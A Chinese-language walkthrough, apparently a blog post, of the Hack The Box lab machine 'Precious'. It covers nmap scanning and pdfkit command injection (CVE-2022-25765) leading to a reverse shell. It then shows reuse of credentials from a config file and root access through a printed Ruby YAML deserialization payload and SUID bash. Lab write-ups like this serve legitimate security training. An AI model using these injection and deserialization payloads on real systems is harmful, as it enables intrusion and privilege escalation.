![在这里插入图片描述](https://img-blog.csdnimg.cn/c61181ad065f424ebc80d6bf4c6f5d48.png)

靶机网址：
```
https://app.hackthebox.com/machines/Precious
```
# 枚举
使用nmap枚举靶机
```
nmap -sC -sV 10.10.11.189
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a4bda55066714e72b697834b723dee71.png)

发现域名，我们本地DNS解析一下
```
echo "10.10.11.189 precious.htb" >> /etc/hosts
```
然后访问网站
# CVE-2022-25765利用

![在这里插入图片描述](https://img-blog.csdnimg.cn/ba987b8403ee40d29793710e401839b7.png)

他的功能是将网站页面转换成PDF文件，我们本地用python开启一个http服务
```
python3 -m http.server 80
```
返回网站，然后输入

![在这里插入图片描述](https://img-blog.csdnimg.cn/39bf4880a6bf4cc496bf58a6bb3ee10a.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/26ba1332488d431bb1ed52ee2b4fe94e.png)

他将我目录下的文件转换为PDF了，我们保存一下这个pdf文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/f5726be3eaa5462880abb6bd04cffabb.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/a244c0d1161242d1ae70362634837d60.png)
```
exiftool 4pukysg1oivmrhiow532m9v4olsfv3p2.pdf
```

通过分析这个PDF文件，发现他使用的是pdfkit v0.8.6

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb2cb02093284c768493e4dc0f1cdd50.png)

通过google搜索，发现这个版本存在CVE-2022-25765漏洞
```
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/d8c5ae1be62f437b8c62239992308c9d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/1cc9c4cb36ee4e2c880ea972d9dcfdc9.png)

我们可以远程执行代码，poc为
```
http//ip?name=%20`command`
```
我们返回网站执行试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/ab7a881a58b5441cb638bfb7237d2476.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/27015b6486294ca5a056adbdab0678ed.png)

成功执行了我们的命令，现在我们直接反弹shell即可

首先先用nc监听一个端口

![在这里插入图片描述](https://img-blog.csdnimg.cn/06ee2410c8de485aa16c2075f5b7bf3c.png)


```
https://www.revshells.com/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0da2d85400f740d39b1c1b5985204618.png)

选择python3，修改ip和端口，回到靶机网页，然后粘贴这个命令即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/79bb2881bf304450b59b164525730dbb.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/15027bdeab924a2ea71f579466ffcbe2.png)

在home目录里找了一下，发现ruby用户目录下有一个奇怪的文件夹

![在这里插入图片描述](https://img-blog.csdnimg.cn/6b538d9b17934064a84e45b5cf24e850.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/b8e4dfd810c244b9b3f5c510d819bf4d.png)

config文件里存放着henry用户的密码，我们ssh登录即可

```
ssh henry@10.10.11.189
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/d833091f36294642881b4f47b479e61e.png)
# YAML反序列化攻击提权
在输入sudo -l时，发现有一个文件可以以sudo命令执行

![在这里插入图片描述](https://img-blog.csdnimg.cn/29de9a8675174a66a2fc65e265792c32.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c5fcb0606a6e4ba794ed6a8794c666d7.png)
```
# Compare installed dependencies with those specified in "dependencies.yml"                                                                                                                                                                                                                                                
require "yaml"                                                                                                                                                                                                                                                                                                             
require 'rubygems'                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                           
# TODO: update versions automatically                                                                                                                                                                                                                                                                                      
def update_gems()                                                                                                                                                                                                                                                                                                          
end                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
def list_from_file                                                                                                                                                                                                                                                                                                         
    YAML.load(File.read("dependencies.yml"))                                                                                                                                                                                                                                                                               
end                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
def list_local_gems                                                                                                                                                                                                                                                                                                        
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}                                                                                                                                                                                                                       
end                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                           
gems_file = list_from_file                                                                                                                                                                                                                                                                                                 
gems_local = list_local_gems                                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                                                           
gems_file.each do |file_name, file_version|                                                                                                                                                                                                                                                                                
    gems_local.each do |local_name, local_version|                                                                                                                                                                                                                                                                         
        if(file_name == local_name)                                                                                                                                                                                                                                                                                        
            if(file_version != local_version)                                                                                                                                                                                                                                                                              
                puts "Installed version differs from the one specified in file: " + local_name                                                                                                                                                                                                                             
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
通过google发现，yaml有一个反序列化的漏洞

![在这里插入图片描述](https://img-blog.csdnimg.cn/54f141e9af65444fb92f26eabcdadd31.png)

payload为

```
https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/f3b4aabe1b78481bb48e49e6e8d52cf6.png)

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/11eb40a3fc1c49bb89f73015e4a7db4e.png)

这里读取的是一个名叫dependencies.yml的文件，所以我们要把payload的文件名改成这个

![在这里插入图片描述](https://img-blog.csdnimg.cn/22988bf29f68476db9e8b79a7841a827.png)

执行
```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/176f7533d798486ab82be7cd2d5f9b34.png)

成功执行了id命令，接下来赋予/bin/bash suid权限即可提权

![在这里插入图片描述](https://img-blog.csdnimg.cn/7d28a6636b9a4bf8a30edbdd56d121ba.png)

执行
```
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fe5962fc793d4c4d8615b9645816d35a.png)

成功赋予suid权限
```
/bin/bash -p
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/a3475df4c4054f20bb444f42ff6ab34c.png)

成功获得root权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/2809b08ed8474edca053fb535e8e9939.png)

